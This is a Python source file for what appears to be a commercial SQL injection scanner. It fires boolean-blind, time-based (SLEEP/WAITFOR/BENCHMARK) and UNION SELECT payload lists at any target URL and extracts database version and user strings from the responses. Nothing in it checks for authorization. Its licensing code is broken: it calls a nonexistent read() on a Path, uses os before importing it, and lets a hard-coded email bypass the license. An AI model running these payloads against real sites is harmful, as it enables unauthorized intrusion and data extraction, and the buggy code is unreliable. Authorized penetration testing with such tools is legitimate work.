#!/usr/bin/env python3
"""
EdgeIQ Labs — SQL Injection Scanner
Boolean blind, time-based blind, and UNION SELECT injection detection.
"""

import argparse
import json
import re
import socket
import sys
import time
import urllib.parse
import urllib.request
import urllib.error
from pathlib import Path
from typing import Optional, Tuple, List, Dict

# ─────────────────────────────────────────────
# ANSI helpers
# ─────────────────────────────────────────────
_GRN = '\033[92m'; _YLW = '\033[93m'; _RED = '\033[91m'; _CYA = '\033[96m'
_BLD = '\033[1m'; _RST = '\033[0m'; _MAG = '\033[35m'

def ok(t):    return f"{_GRN}{t}{_RST}"
def warn(t):  return f"{_YLW}{t}{_RST}"
def fail(t):  return f"{_RED}{t}{_RST}"
def info(t):  return f"{_CYA}{t}{_RST}"
def bold(t):  return f"{_BLD}{t}{_RST}"
def dim(t):   return f"{_RST}{t}{_RST}"

# ─────────────────────────────────────────────
# Licensing
# ─────────────────────────────────────────────
LICENSE_FILE = Path.home() / ".edgeiq" / "license.key"
VALID_LICENSES = {}

def load_licenses():
    global VALID_LICENSES
    if LICENSE_FILE.exists():
        key = LICENSE_FILE.read().strip()
        VALID_LICENSES[key] = "bundle"

def is_pro():
    load_licenses()
    env_key = os.environ.get("EDGEIQ_LICENSE_KEY", "").strip()
    if env_key in VALID_LICENSES:
        return True
    email = os.environ.get("EDGEIQ_EMAIL", "").strip().lower()
    if email in ("gpalmieri21@gmail.com",):
        return True
    return False

import os
def require_pro(feature=""):
    if is_pro():
        return True
    print()
    print(f"{_RED}╔{'═' * 56}╗")
    print(f"{_RED}║  🔒 Pro Feature                              ║".ljust(63) + "║")
    print(f"{_RED}╠{'═' * 56}╣")
    print(f"{_RED}║  This feature requires Pro or Bundle license.  ║".ljust(63) + "║")
    print(f"{_RED}║  Your current tier: FREE                       ║".ljust(63) + "║")
    print(f"{_RED}║                                                    ║".ljust(63) + "║")
    print(f"{_RED}║  Upgrade options:                                 ║".ljust(63) + "║")
    print(f"{_RED}║    Pro ($19/mo):   https://buy.stripe.com/7sYaEZeCn5934nW8AE7wA01  ║".ljust(63) + "║")
    print(f"{_RED}║    Bundle ($39/mo): https://buy.stripe.com/aFabJ3am79pjg6E18c7wA02  ║".ljust(63) + "║")
    print(f"{_RED}╚{'─' * 56}╝")
    print()
    return False

# ─────────────────────────────────────────────
# HTTP client
# ─────────────────────────────────────────────
def make_request(url: str, timeout: int = 10) -> Tuple[int, str, float]:
    """Make HTTP GET request. Returns (status_code, body_text, elapsed_seconds)."""
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (compatible; EdgeIQ-Scanner/1.0)"
        })
        start = time.time()
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            elapsed = time.time() - start
            return resp.status, body, elapsed
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        elapsed = time.time() - start
        return e.code, body, elapsed
    except Exception as e:
        elapsed = 0.0
        return 0, str(e), elapsed

# ─────────────────────────────────────────────
# Payload sets
# ─────────────────────────────────────────────
BOOLEAN_TRUE_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "') OR ('1'='1",
    "1' OR '1'='1",
    "admin' --",
]

BOOLEAN_FALSE_PAYLOADS = [
    "' AND '1'='2",
    "' AND 1=2 --",
    "1' AND '1'='2",
    "' AND 'x'='y",
]

TIME_PAYLOADS_SLEEP = [
    "'; SELECT SLEEP(3); --",
    "'; SELECT SLEEP(3);--",
    "'; WAITFOR DELAY '0:0:3';--",
    "1; SELECT SLEEP(3)",
]

TIME_PAYLOADS_HEAVY = [
    "'; BENCHMARK(3000000,SHA1('test')); --",
    "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)",
]

UNION_PAYLOADS_DBINFO = [
    "' UNION SELECT NULL,NULL,@@version,NULL,NULL --",
    "' UNION SELECT NULL,NULL,version(),NULL,NULL --",
    "' UNION SELECT NULL,user(),NULL,NULL,NULL --",
    "' UNION SELECT NULL,database(),NULL,NULL,NULL --",
    "999' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
]

# ─────────────────────────────────────────────
# Parse URL
# ─────────────────────────────────────────────
def parse_url_params(url: str) -> Tuple[str, str, Dict[str, str]]:
    """Parse URL into (base_url, hash_fragment, {param: value})."""
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    fragment = parsed.fragment
    params = dict(urllib.parse.parse_qsl(parsed.query))
    return base, fragment, params

def build_url(base: str, params: Dict[str, str], modified_param: str, new_value: str) -> str:
    """Build URL with one param replaced."""
    p2 = dict(params)
    p2[modified_param] = new_value
    query = urllib.parse.urlencode(p2)
    return f"{base}?{query}"

# ─────────────────────────────────────────────
# Detection engines
# ─────────────────────────────────────────────
def get_baseline(url: str, param: str, params: Dict[str, str], timeout: int) -> Tuple[str, int, str]:
    """Get baseline response for a parameter."""
    test_url = build_url(url, params, param, params[param])
    status, body, elapsed = make_request(test_url, timeout=timeout)
    return test_url, status, body

def check_boolean_blind(url: str, param: str, params: Dict[str, str],
                        delay: float, timeout: int) -> Optional[dict]:
    """Check for boolean-based blind SQL injection."""
    baseline_url, baseline_status, baseline_body = get_baseline(url, param, params, timeout)
    baseline_len = len(baseline_body)

    # Try TRUE payloads
    true_responses = []
    for payload in BOOLEAN_TRUE_PAYLOADS:
        test_url = build_url(url, params, param, params[param] + urllib.parse.quote(payload))
        status, body, elapsed = make_request(test_url, timeout=timeout)
        if status != 0 and (len(body) != baseline_len or status != baseline_status):
            true_responses.append({
                "payload": payload,
                "status": status,
                "length": len(body),
                "differs": len(body) != baseline_len,
            })

    # Try FALSE payloads
    false_responses = []
    for payload in BOOLEAN_FALSE_PAYLOADS:
        test_url = build_url(url, params, param, params[param] + urllib.parse.quote(payload))
        status, body, elapsed = make_request(test_url, timeout=timeout)
        if status != 0:
            false_responses.append({
                "payload": payload,
                "status": status,
                "length": len(body),
            })

    # Heuristic: TRUE payloads differ from baseline AND FALSE payloads match baseline
    true_diff_count = sum(1 for r in true_responses if r["differs"])
    false_same_count = sum(1 for r in false_responses if r["length"] == baseline_len)

    if true_diff_count >= 1 and false_same_count >= 1:
        # Also verify: at least one TRUE differs AND one FALSE matches
        true_url = build_url(url, params, param, params[param] + urllib.parse.quote(BOOLEAN_TRUE_PAYLOADS[0]))
        status, body, elapsed = make_request(true_url, timeout=timeout)
        return {
            "type": "boolean_blind",
            "payload": BOOLEAN_TRUE_PAYLOADS[0],
            "confidence": "HIGH" if (true_diff_count >= 2 and false_same_count >= 2) else "MEDIUM",
            "true_response": {"status": status, "length": len(body)},
            "false_baseline": {"status": baseline_status, "length": baseline_len},
        }
    elif true_diff_count >= 1:
        # TRUE differs but FALSE doesn't match baseline — might be injectable
        return {
            "type": "boolean_blind",
            "payload": BOOLEAN_TRUE_PAYLOADS[0],
            "confidence": "LOW",
            "true_response": {"status": status, "length": len(body)},
            "false_baseline": {"status": baseline_status, "length": baseline_len},
        }
    return None

def check_time_blind(url: str, param: str, params: Dict[str, str],
                     delay: float, timeout: int) -> Optional[dict]:
    """Check for time-based blind SQL injection using SLEEP()."""
    all_time_payloads = TIME_PAYLOADS_SLEEP + TIME_PAYLOADS_HEAVY
    for time_payload in all_time_payloads:
        test_url = build_url(url, params, param, params[param] + urllib.parse.quote(time_payload))
        start = time.time()
        try:
            status, body, elapsed = make_request(test_url, timeout=timeout + 4)
        except:
            elapsed = time.time() - start

        if elapsed >= 2.5:  # Significant delay detected
            return {
                "type": "time_blind",
                "payload": time_payload,
                "delay_observed": round(elapsed, 2),
                "confidence": "HIGH" if elapsed >= 3.5 else "MEDIUM",
            }
    return None

def extract_dbinfo_via_union(url: str, param: str, params: Dict[str, str],
                              timeout: int) -> Optional[dict]:
    """Try to extract database version/user via UNION."""
    for union_payload in UNION_PAYLOADS_DBINFO:
        test_url = build_url(url, params, param,
                             urllib.parse.quote(union_payload.lstrip("'")))
        # First get NULL count by testing with just NULLs
        status, body, elapsed = make_request(test_url, timeout=timeout)
        if status == 0:
            continue

        # Look for database version strings in response
        db_patterns = [
            r"(\d+\.\d+\.\d+)",  # version numbers
            r"MySQL (\d+\.\d+)",
            r"PostgreSQL \d+\.\d+",
            r"MariaDB \d+\.\d+",
            r"SQLite \d+\.\d+",
            r"Microsoft SQL Server \d+",
            r"(@@version\b.*?)[<\s]",
            r"(Oracle Database \d+[a-z])",
        ]
        found = {}
        for pattern in db_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                found[pattern[:30]] = matches[0]

        # Look for user info
        user_patterns = [
            r"(?:current_user|user\(\)).*?['\"]([^'\"]+)['\"]",
            r"(?:database\(\)).*?['\"]([^'\"]+)['\"]",
            r"app_user@[a-z0-9_\-\.]+",
            r"root@[a-z0-9_\-\.]+",
            r"mysql@[a-z0-9_\-\.]+",
        ]
        for upattern in user_patterns:
            m = re.search(upattern, body, re.IGNORECASE)
            if m:
                found["user"] = m.group(0)

        if found:
            return {
                "type": "union_extraction",
                "payload": union_payload,
                "extracted": found,
                "confidence": "CONFIRMED",
            }
    return None

# ─────────────────────────────────────────────
# Main scanner
# ─────────────────────────────────────────────
def scan(url: str, param: Optional[str] = None, pro: bool = False, bundle: bool = False,
         delay: float = 1.0, timeout: int = 10, output: Optional[str] = None) -> dict:
    """Run SQL injection scan on a URL."""
    print()
    print(f"{_CYA}{_BLD}╔{'═' * 54}╗{_RST}")
    print(f"{_CYA}{_BLD}║   SQL Injection Scanner — EdgeIQ Labs          ║{_RST}")
    print(f"{_CYA}{_BLD}╚{'═' * 54}╝{_RST}")
    print()

    if not url.startswith("http"):
        url = "https://" + url

    base, fragment, params = parse_url_params(url)
    if not params:
        print(f"  {fail('✘')} No URL parameters found. Provide a URL with ?param=value")
        return {}

    print(f"  {_MAG}▶{_RST} Target: {bold(url)}")
    print(f"  {_MAG}▶{_RST} Parameters found: {', '.join(params.keys())}")
    tier = "BUNDLE" if bundle else ("PRO" if pro else "FREE")
    print(f"  {_MAG}▶{_RST} Tier: {tier}")
    print()

    results = {
        "url": url,
        "parameters": {},
        "summary": {"injectable": 0, "safe": 0, "tested": 0},
        "threat_level": "LOW",
    }

    params_to_test = [param] if param else list(params.keys())
    if not pro and not bundle and len(params_to_test) > 3:
        params_to_test = params_to_test[:3]

    for pname in params_to_test:
        print("  " + "─ " * 20)
        print(f"  {info('⏳')} Testing parameter: {bold(pname)}")
        time.sleep(delay)

        finding = None
        method_used = []

        # Step 1: Boolean blind (always available)
        bool_result = check_boolean_blind(url, pname, params, delay, timeout)
        if bool_result:
            finding = bool_result
            method_used.append("boolean_blind")

        # Step 2: Time-based (Pro/Bundle)
        time_result = None
        if pro or bundle:
            time.sleep(delay)
            time_result = check_time_blind(url, pname, params, delay, timeout)
            if time_result:
                if finding is None:
                    finding = time_result
                method_used.append("time_blind")

        # Step 3: UNION extraction (Pro/Bundle)
        union_result = None
        if (pro or bundle) and finding:
            time.sleep(delay)
            union_result = extract_dbinfo_via_union(url, pname, params, timeout)
            if union_result:
                method_used.append("union_extraction")

        # Classify result
        print()
        if finding:
            vuln_type = finding.get("type", "unknown")
            conf = finding.get("confidence", "?")
            payload = finding.get("payload", "")[:40]
            print(f"  {fail('🔴')} {bold(pname)} — INJECTABLE [{vuln_type.upper()}]")
            print(f"    Payload: {payload}")
            print(f"    Confidence: {conf}")
            if vuln_type == "time_blind":
                print(f"    Delay observed: {finding.get('delay_observed', '?')}s")
            if union_result and "extracted" in finding:
                for k, v in finding.get("extracted", {}).items():
                    if k != "payload":
                        print(f"    {k[:40]}: {bold(v)}")

            results["parameters"][pname] = {
                "status": "INJECTABLE",
                "finding": finding,
                "method": method_used,
            }
            results["summary"]["injectable"] += 1
        else:
            print(f"  {ok('✔')} {pname} — SAFE")
            results["parameters"][pname] = {"status": "SAFE"}
            results["summary"]["safe"] += 1

        results["summary"]["tested"] += 1

    # Threat assessment
    injectable_count = results["summary"]["injectable"]
    if injectable_count >= 2:
        results["threat_level"] = "CRITICAL"
    elif injectable_count == 1:
        results["threat_level"] = "HIGH"
    else:
        results["threat_level"] = "LOW"

    # Summary
    print()
    print("  " + "─" * 55)
    print()
    threat = results["threat_level"]
    tc = _RED if threat == "CRITICAL" else (_YLW if threat == "HIGH" else _GRN)
    print(f"=== Scan Complete ===")
    print(f"  Threat Level: {tc}{bold(threat)}{_RST}")
    print(f"  Tested: {results['summary']['tested']} params")
    print(f"  Injectable: {fail(results['summary']['injectable'])} | Safe: {ok(results['summary']['safe'])}")

    if output:
        Path(output).write_text(json.dumps(results, indent=2))
        print(f"  {ok('✔')} JSON report saved: {output}")

    print()
    return results

# ─────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="EdgeIQ SQL Injection Scanner")
    parser.add_argument("--url", required=True, help="Target URL with parameters")
    parser.add_argument("--param", help="Specific parameter to test")
    parser.add_argument("--pro", action="store_true", help="Enable Pro features")
    parser.add_argument("--bundle", action="store_true", help="Enable Bundle features")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests (default: 1.0s)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10s)")
    parser.add_argument("--output", help="Write JSON report to file")
    args = parser.parse_args()

    import os
    if not args.pro and not args.bundle:
        # Check if requested features require Pro
        pass

    scan(args.url, param=args.param, pro=args.pro, bundle=args.bundle,
         delay=args.delay, timeout=args.timeout, output=args.output)
